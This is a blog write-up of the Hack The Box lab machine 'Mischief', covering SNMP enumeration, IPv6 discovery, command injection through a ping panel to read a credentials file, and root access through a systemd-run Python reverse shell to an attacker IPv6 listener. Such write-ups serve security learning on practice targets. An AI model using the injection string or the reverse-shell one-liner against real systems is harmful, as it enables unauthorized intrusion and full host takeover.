---
title: HTB - Mischief Write-up
author: bigb0ss
date: 2020-11-05 21:36:00 +0800
categories: [Hack The Box, Linux, Insane]
tags: [hackthebox, mischief, SNMP, IPv6, ICMP, systemd-run]
image: /assets/img/post/htb/mischief/01_infocard.png
---

This was an insane difficulty box and had many tricky steps to fully compromise it. Good learning path for:
* UDP Service Enumeration
* SNMP to obtain IPv6 Address
* ICMP Data Exfiltration
* `systemd-run` Command

## Recon

### Nmap

Let’s begin with an initial port scan:

```console
$ nmap -Pn --open -p- -T4 -sC -sV 10.10.10.92

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
| http-auth: 
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Test
|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's also run a port scan against the UDP ports as well:

```console
$ nmap -Pn --open -sU -F 10.10.10.92

PORT    STATE SERVICE
161/udp open  snmp
```

### Interesting Ports

* HTTP (3366/TCP) - Website with Authentication Prompt. No easy credentials worked
* SNMP (161/UDP) - Simple Network Management Protocol

### SNMP (Credentials)

By using `snmpwalk`, we can see the list of the SNMP information. Especially, it reveals a set of credentials `loki : godofmischiefisloki`. 

```console
$ snmpwalk -v1 -c public 10.10.10.92

...snip...

iso.3.6.1.2.1.25.4.2.1.5.588 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
iso.3.6.1.2.1.25.4.2.1.5.603 = ""

...snip...
```

Using the found credentials, we could log into the `http://10.10.10.92:3366` page and find another set of credentials `loki : trickeryanddeceit`; however, it was dead-end. Using both of the credentials for `SSH` did not work either.

![image](/assets/img/post/htb/mischief/02_cred.png)

### SNMP (IPv6)

When we inspect the `snmpwalk` result again, we can see the hex-converted IPv6 address `222.173.190.239.0.0.0.0.2.80.86.255.254.185.104.27`:

```console
...snip

iso.3.6.1.2.1.4.34.1.6.1.4.10.10.10.92 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.6.1.4.10.10.10.255 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.6.1.4.127.0.0.1 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.6.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.6.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.185.104.27 = INTEGER: 5
iso.3.6.1.2.1.4.34.1.6.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.185.104.27 = INTEGER: 5

...snip
```

Use the following `Python` script to covert the numbers into hex:

```python
# hexIPv6.py

import sys

hexIPv6 = sys.argv[1].split(".")

ip = ""

for i in hexIPv6:
    ip += hex(int(i))[2:].rjust(2, "0")

print ".".join(ip[i:i+4] for i in range(0, len(ip), 4))
```

```console
$ python hexIPv6.py 222.173.190.239.0.0.0.0.2.80.86.255.254.185.104.27
dead.beef.0000.0000.0250.56ff.feb9.681b
```

### Nmap (IPv6)

Let's run another scan against that IPv6 address. And this time, we can see the port 80 open.

```console
$nmap -Pn --open -6 -sC -sV dead:beef:0000:0000:0250:56ff:feb9:681b

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 00:50:56:b9:68:1b
|_      manuf: VMware
```

Let's add the IPv6 address to our `/etc/hosts` in order to browse the HTTP (80/tcp) page in the browser.

```console
$ vi /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali

### htb
dead:beef:0000:0000:0250:56ff:feb9:681b mischief.htb
```

Once we browse the page, we will be prompted with another login page.

![image](/assets/img/post/htb/mischief/03_login.png)

![image](/assets/img/post/htb/mischief/04_login.png)


## Initial Foothold

### Password Shuffling

Currently, we have the following two (2) credentials:

```console
loki : godofmischiefisloki
loki : trickeryanddeceit
```

However, both of the credentials did not work on that newly found login page. But doing some common username with those passwords combo, we can find the user `administrator` is using the password `trickeryanddeceit` for that login page. And we are now redirected to the Command Execution Panel.

![image](/assets/img/post/htb/mischief/05_rce.png)

### RCE (Sensitive Data Access)

The page also gives some hint: `In my home directory, i have my password in a file called credentials, Mr Admin`. But it restricts which commands can be used. Using the following command, we can successfully obtain the new password (`lokiisthebestnorsegod`) for the `loki` user:

```console
ping -c 2 127.0.0.1; cat /home/loki/c*;
```

![image](/assets/img/post/htb/mischief/06_pass.png)

### SSH (loki)

<b>user.txt</b>

With this credenitals (`loki : lokiisthebestnorsegod`), we can now `ssh` into the host. And we can also read the `user.txt` flag.

![image](/assets/img/post/htb/mischief/07_ssh.png)


## Privilege Escalation

### loki --> root (systemd-run)

Another password can be found in `loki`'s `.bash_history` file.

![image](/assets/img/post/htb/mischief/08_bashHistory.png)

I wanted to try that newly obtained password (`lokipasswordmischieftrickery`) for the `root` user, but `/bin/su` command was restricted for the `loki` user, and `SSH` as the `root` user with password was also restricted.

```console
loki@Mischief:~$ su
-bash: /bin/su: Permission denied
```

By checking the `/bin/su` permission via `getfacl` command, we can see that the `loki` user cannot execute the command:

```console
loki@Mischief:~$ getfacl /bin/su
getfacl: Removing leading '/' from absolute path names
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x
```

<b>systemd-run</b>

We can see that the `loki` user can run the `systemd-run` command, which is:
>**Systemd-run**: If a command is run as transient scope unit, it will be executed by systemd-run itself as parent process and will thus inherit the execution environment of the caller.

And another caveat for the network issue is that the `Mischief` host does not allow IPv4 outbound connection; however, it allows it via IPv6. And the `systemd-run` command will not give us interative shell acess, so we will create a reverse shell over IPv6 with it. 

```console
loki@Mischief:~$ systemd-run python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1017",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to manage system services or other units.                                                                                                             
Authenticating as: root
Password: 
==== AUTHENTICATION COMPLETE ===
Running as unit: run-u11.service
```

In our `ncat` lister, we will get the `root` shell.

```console
root@kali:~/Documents/htb/box/mischief# ncat -6 -lvnp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Connection from dead:beef::250:56ff:feb9:5f3d.
Ncat: Connection from dead:beef::250:56ff:feb9:5f3d:38456.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

# ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.92  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:5f3d  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:5f3d  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:5f:3d  txqueuelen 1000  (Ethernet)
        RX packets 763  bytes 63135 (63.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 343  bytes 44280 (44.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

<b>root.txt</b>

The `root.txt` flag wasn't there as usual. But just simply using the `find` command we could find the actual location for the real `root.txt` file.

```console
# cat /root/root.txt
The flag is not here, get a shell to find it!

# find / -name root.txt
/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
/root/root.txt

# cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
ae15<REDACTED>7807
```

## Post-Ex 

### Iptables

So I wanted to check why the IPv4 outbound was not allowed. It turned out to be only SNMP (UDP) and SSH, 3366 (TCP) are allowed for ingress and egress. 

```console
# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     udp  --  anywhere             anywhere             udp spt:snmp
ACCEPT     udp  --  anywhere             anywhere             udp dpt:snmp
DROP       udp  --  anywhere             anywhere            
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:3366
DROP       tcp  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     udp  --  anywhere             anywhere             udp dpt:snmp
ACCEPT     udp  --  anywhere             anywhere             udp spt:snmp
DROP       udp  --  anywhere             anywhere            
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:3366
DROP       tcp  --  anywhere             anywhere   
```

However, the IPv6 iptables is wide open for both ingress and egress. That was why we were able to do a reverse shell using it.

```console
# ip6tables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination  
```

### SSH Root User

I also checked the `/etc/ssh/sshd.config` file and confirmed that the `root` user was not allowed to `SSH` with password.

```console
# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password    <-- Commendted
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10
```



Thanks for reading! :]